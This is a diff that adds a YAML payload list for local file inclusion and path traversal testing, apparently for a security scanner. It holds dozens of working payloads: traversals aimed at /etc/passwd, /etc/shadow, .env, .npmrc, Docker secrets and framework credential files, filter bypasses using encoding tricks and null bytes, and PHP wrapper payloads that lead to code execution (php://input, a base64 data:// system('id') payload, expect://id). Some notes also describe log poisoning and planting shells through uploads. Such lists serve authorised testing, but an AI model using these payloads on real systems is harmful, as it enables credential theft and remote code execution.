@@ -1,0 +1,540 @@
+defaults:
+  vuln_type: lfi
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # Basic directory traversal — Linux
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/passwd"
+    notes: "Basic path traversal to /etc/passwd. Look for root:x: in response."
+    tags: [linux, passwd, basic]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../../etc/passwd"
+    notes: "4-level traversal. Use more ../  if fewer levels don't work."
+    tags: [linux, passwd]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../../../../etc/passwd"
+    notes: "6-level traversal. Covers most directory depths."
+    tags: [linux, passwd, deep]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/shadow"
+    notes: "Attempt to read /etc/shadow. Requires root/elevated privileges."
+    tags: [linux, shadow, elevated]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/hostname"
+    notes: "Read hostname for confirmation."
+    tags: [linux, hostname, confirmation]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "../../../proc/self/environ"
+    notes: "Read process environment variables. May leak secrets."
+    tags: [linux, proc, environ]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "../../../proc/self/cmdline"
+    notes: "Read process command line. Reveals application startup command."
+    tags: [linux, proc, cmdline]
+
+  # Basic directory traversal — Windows
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "..\\..\\..\\windows\\win.ini"
+    notes: "Windows path traversal to win.ini."
+    tags: [windows, win_ini]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    notes: "Windows hosts file."
+    tags: [windows, hosts]
+
+  # Bypass — double encoding
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: double_url
+    evidence_type: content_match
+    risk: 3
+    payload: "..%252f..%252f..%252fetc%252fpasswd"
+    notes: "Double URL-encoded traversal. Bypasses single-decode filters."
+    tags: [linux, double_encoded, bypass]
+
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "..%2f..%2f..%2fetc%2fpasswd"
+    notes: "URL-encoded forward slashes."
+    tags: [linux, url_encoded]
+
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    notes: "URL-encoded dots."
+    tags: [linux, url_encoded, dots]
+
+  # Bypass — dot stripping
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "....//....//....//etc/passwd"
+    notes: "Double dot-slash. If app strips ../ once, ....// becomes ../"
+    tags: [linux, bypass, double_strip]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "..../..../..../etc/passwd"
+    notes: "Extra dots bypass. Some filters only match exact ../"
+    tags: [linux, bypass, extra_dots]
+
+  # Bypass — Tomcat semicolon trick
+  - technique: directory_traversal
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "..;/..;/..;/etc/passwd"
+    notes: "Tomcat path parameter bypass. Semicolon causes Tomcat to ignore segment before ;/ during path normalization but the filesystem resolves it."
+    tags: [linux, tomcat, bypass, java]
+
+  # Bypass — overlong UTF-8
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: unicode
+    evidence_type: content_match
+    risk: 3
+    payload: "..%c0%af..%c0%af..%c0%afetc/passwd"
+    notes: "Overlong UTF-8 encoding of /. Bypasses filters that do not normalize Unicode."
+    tags: [linux, bypass, overlong_utf8, unicode]
+
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: unicode
+    evidence_type: content_match
+    risk: 3
+    payload: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"
+    notes: "Fullwidth solidus (U+FF0F) instead of /. Some frameworks normalize this to a forward slash."
+    tags: [linux, bypass, fullwidth, unicode]
+
+  # Null byte injection (legacy PHP < 5.3.4)
+  - technique: null_byte
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "../../../etc/passwd%00"
+    notes: "Null byte truncation. Strips appended extension (e.g., .php). Legacy PHP only."
+    tags: [linux, null_byte, php, legacy]
+
+  - technique: null_byte
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "../../../etc/passwd%00.jpg"
+    notes: "Null byte + fake extension. Tricks extension checks."
+    tags: [linux, null_byte, php, extension_bypass]
+
+  # PHP wrappers
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "php://filter/convert.base64-encode/resource=FILE_PATH"
+    placeholders: [FILE_PATH]
+    notes: "PHP filter wrapper. Returns base64-encoded file content. Bypasses execution."
+    tags: [php, wrapper, filter, base64]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "php://filter/read=string.rot13/resource=FILE_PATH"
+    placeholders: [FILE_PATH]
+    notes: "PHP ROT13 filter. Alternative encoding to bypass filters."
+    tags: [php, wrapper, filter, rot13]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "php://input"
+    notes: "PHP input wrapper. Reads raw POST body. With <?php system('id'); ?> in body = RCE."
+    tags: [php, wrapper, input, rce]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+    notes: "Data wrapper with base64 PHP code (<?php system('id'); ?>). Requires allow_url_include."
+    tags: [php, wrapper, data, rce]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    runtime: php
+    payload: "expect://id"
+    notes: "Expect wrapper for command execution. Requires expect extension."
+    tags: [php, wrapper, expect, rce]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "php://filter/convert.base64-encode/resource=index"
+    notes: "Read application source via PHP filter on index (no extension needed)."
+    tags: [php, wrapper, filter, source]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "zip://uploads/shell.jpg%23shell.php"
+    notes: "ZIP wrapper to access PHP file inside uploaded ZIP renamed as .jpg."
+    tags: [php, wrapper, zip, upload]
+
+  - technique: wrapper
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "phar://uploads/shell.jpg/shell.php"
+    notes: "PHAR wrapper to access PHP file inside PHAR archive."
+    tags: [php, wrapper, phar, upload]
+
+  # JSON body variants
+  - technique: directory_traversal
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/passwd"
+    notes: "Path traversal via JSON body field (e.g., filename, path parameter)."
+    tags: [linux, json, passwd]
+
+  - technique: directory_traversal
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "....//....//....//etc/passwd"
+    notes: "Double dot-slash bypass via JSON body."
+    tags: [linux, json, bypass]
+
+  # URL-encoded full path
+  - technique: directory_traversal
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    notes: "Fully URL-encoded traversal path."
+    tags: [linux, url_encoded, full]
+
+  # Path parameter injection
+  - technique: directory_traversal
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "..%2f..%2f..%2fetc%2fpasswd"
+    notes: "Path segment traversal. URL-encoded to survive routing."
+    tags: [linux, path_segment, url_encoded]
+
+  - technique: directory_traversal
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "....//....//....//etc/passwd"
+    notes: "Double dot-slash via path segment."
+    tags: [linux, path_segment, bypass]
+
+  # Header injection
+  - technique: directory_traversal
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/passwd"
+    notes: "LFI via header (e.g., X-File-Path, Content-Disposition filename)."
+    tags: [linux, header, passwd]
+
+  # Application-specific files
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../.env"
+    notes: "Read .env file. May contain API keys, DB credentials, secrets."
+    tags: [dotenv, secrets]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../package.json"
+    notes: "Read package.json to enumerate dependencies."
+    tags: [node, package_json, recon]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../.git/config"
+    notes: "Read .git/config to confirm git repo and potentially find remote URLs."
+    tags: [git, config, recon]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../.git/HEAD"
+    notes: "Read .git/HEAD to confirm git repository."
+    tags: [git, head, recon]
+
+  # File upload context
+  - technique: directory_traversal
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 4
+    payload: "../../../tmp/shell.php"
+    notes: "Traversal in uploaded filename. If server uses filename for storage path."
+    tags: [upload, filename, traversal]
+
+  - technique: directory_traversal
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 4
+    payload: "..\\..\\..\\tmp\\shell.php"
+    notes: "Windows backslash traversal in uploaded filename."
+    tags: [upload, filename, windows, traversal]
+
+  # Docker / container-specific files
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "../../../proc/1/cgroup"
+    notes: "Read cgroup info for PID 1. Presence of /docker/ or container ID confirms containerized environment."
+    tags: [linux, docker, container, recon]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../run/secrets/SECRET_NAME"
+    placeholders: [SECRET_NAME]
+    notes: "Docker secrets mount path. Secrets are mounted as files under /run/secrets/ in Docker Swarm."
+    tags: [linux, docker, secrets, swarm]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "../../../proc/self/mountinfo"
+    notes: "Read mount info. Reveals overlay filesystem and container volume mounts."
+    tags: [linux, docker, container, mountinfo, recon]
+
+  # AWS Lambda / cloud environment files
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/task/index.js"
+    notes: "AWS Lambda function code. Lambda handlers are deployed to /var/task/."
+    tags: [linux, aws, lambda, node, source]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/task/handler.py"
+    notes: "AWS Lambda Python handler. Common filename for Python Lambda functions."
+    tags: [linux, aws, lambda, python, source]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/runtime/bootstrap"
+    notes: "AWS Lambda custom runtime bootstrap script. Reveals runtime initialization logic."
+    tags: [linux, aws, lambda, runtime]
+
+  # Application config files — Python
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: python
+    payload: "../../../app/settings.py"
+    notes: "Django settings.py. Contains SECRET_KEY, database credentials, installed apps."
+    tags: [python, django, config, secrets]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../config/config.yml"
+    notes: "Generic YAML config file. Common in Rails, Spring Boot, and many frameworks."
+    tags: [config, yaml, recon]
+
+  # Application config files — Ruby
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: ruby
+    payload: "../../../config/database.yml"
+    notes: "Rails database.yml. Contains database hostnames, usernames, passwords per environment."
+    tags: [ruby, rails, database, secrets]
+
+  # Application config files — .NET
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: dotnet
+    payload: "../../../appsettings.json"
+    notes: "ASP.NET Core configuration. Contains connection strings, JWT secrets, API keys."
+    tags: [dotnet, aspnet, config, secrets]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: dotnet
+    payload: "../../../web.config"
+    notes: "IIS/ASP.NET web.config. Contains connection strings, authentication settings, custom errors config."
+    tags: [dotnet, aspnet, iis, config]
+
+  # Log file inclusion (log poisoning prep)
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/log/apache2/access.log"
+    notes: "Apache access log. Confirm readability for log poisoning attack (inject PHP via User-Agent, then include this log)."
+    tags: [linux, apache, log, poisoning]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/log/nginx/error.log"
+    notes: "Nginx error log. Can contain user-controlled data for log poisoning."
+    tags: [linux, nginx, log, poisoning]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../var/log/mail.log"
+    notes: "Mail log. SMTP header injection can plant PHP code for inclusion."
+    tags: [linux, mail, log, poisoning]
+
+  # Java-specific files
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "../../../WEB-INF/web.xml"
+    notes: "Java web.xml deployment descriptor. Lists servlets, filters, security constraints, and init parameters."
+    tags: [java, webinf, config, recon]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "../../../WEB-INF/classes/application.properties"
+    notes: "Spring Boot application.properties. Contains datasource URLs, credentials, and secrets."
+    tags: [java, spring, config, secrets]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "../../../META-INF/MANIFEST.MF"
+    notes: "JAR/WAR manifest file. Reveals Java version, build tool, and Main-Class entry."
+    tags: [java, manifest, recon]
+
+  # Node.js specific
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "../../../node_modules/.package-lock.json"
+    notes: "Node hidden lockfile. Enumerates exact dependency versions for known-CVE scanning."
+    tags: [node, dependencies, recon]
+
+  - technique: directory_traversal
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "../../../.npmrc"
+    notes: "npm config file. May contain registry auth tokens, private registry URLs."
+    tags: [node, npm, secrets, recon]
+
+  # Cookie injection surface
+  - technique: directory_traversal
+    injection_surface: cookie
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../etc/passwd"
+    notes: "LFI via cookie value. Some apps use cookie values (e.g., language, theme) to build file paths."
+    tags: [linux, cookie, passwd]
+
+  # Form body injection
+  - technique: directory_traversal
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "../../../../../../etc/passwd"
+    notes: "Path traversal via form-encoded body field (e.g., filename, template, include)."
+    tags: [linux, form, passwd]
